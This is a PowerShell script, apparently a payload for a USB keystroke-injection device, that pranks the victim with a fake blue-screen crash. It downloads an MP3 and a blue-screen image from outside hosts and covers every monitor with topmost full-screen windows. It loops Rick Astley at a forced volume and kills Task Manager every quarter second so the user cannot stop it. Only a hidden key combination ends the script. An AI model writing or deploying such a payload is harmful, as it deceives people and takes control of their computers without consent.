# 1. URLS
$mp3Url = "https://qoret.com/dl/uploads/2019/07/Rick_Astley_-_Never_Gonna_Give_You_Up_Qoret.com.mp3"
$pngUrl = "https://raw.githubusercontent.com/the-weeper-jetlearner/the-rickrollforrubberDuckyUSB-ps1/refs/heads/main/bsod.png"

# 2. PUBLIC FOLDER (No Admin needed to write here)
$workDir = "C:\Users\Public\Music\Cache"

# 3. DOWNLOAD
if (!(Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force }
$mp3 = "$workDir\r.mp3"; $png = "$workDir\b.png"
Invoke-WebRequest -Uri $mp3Url -OutFile $mp3 -UseBasicParsing
Invoke-WebRequest -Uri $pngUrl -OutFile $png -UseBasicParsing

while (!(Test-Path $png) -or !(Test-Path $mp3)) { Start-Sleep -s 1 }

# 4. LOAD ENGINES
Add-Type -AssemblyName PresentationCore, System.Windows.Forms, System.Drawing

# 5. AUDIO SETUP
$player = New-Object System.Windows.Media.MediaPlayer
$player.Open([Uri]$mp3)

# 6. MULTI-SCREEN SETUP
$forms = New-Object System.Collections.Generic.List[System.Windows.Forms.Form]
$global:running = $true

foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $f = New-Object Windows.Forms.Form
    $f.FormBorderStyle = "None"
    $f.TopMost = $true
    $f.ShowInTaskbar = $false
    $f.StartPosition = "Manual"
    $f.Location = $screen.Bounds.Location
    $f.Size = $screen.Bounds.Size
    $f.BackgroundImage = [System.Drawing.Image]::FromFile($png)
    $f.BackgroundImageLayout = "Stretch"
    
    # KILL SWITCH (Ctrl+Shift+F4)
    $f.KeyPreview = $true
    $f.Add_KeyDown({
        if ($_.Control -and $_.Shift -and $_.KeyCode -eq "F4") { $global:running = $false }
    })
    
    $f.Show()
    $forms.Add($f)
}

# 7. RUN LOOP
$player.Play()
$ws = New-Object -ComObject WScript.Shell

try {
    while ($global:running) {
        # --- COMBAT CTRL-ALT-DEL (User-Level) ---
        # A normal user can ALWAYS kill their own Task Manager process.
        # This prevents them from using it to stop the script.
        Get-Process taskmgr -ErrorAction SilentlyContinue | Stop-Process -Force
        
        # --- 50% VOLUME LEVELER ---
        # 174 is Down, 175 is Up. 
        # Tap Down 50 times to hit 0, then Up 25 times to hit 50%.
        for ($i=0; $i -lt 50; $i++) { $ws.SendKeys([char]174) }
        for ($i=0; $i -lt 25; $i++) { $ws.SendKeys([char]175) }
        
        # Keep BSOD sticky
        foreach ($f in $forms) { 
            $f.Activate()
            [Windows.Forms.Application]::DoEvents() 
        }
        
        # Loop Audio
        if ($player.Position -ge $player.NaturalDuration.TimeSpan) {
            $player.Position = [TimeSpan]::Zero; $player.Play()
        }
        Start-Sleep -Milliseconds 250
    }
}
finally {
    foreach ($f in $forms) { $f.Close() }
    $player.Stop(); $player.Close()
    Remove-Item -Recurse -Force $workDir
    Stop-Process -Id $PID
}
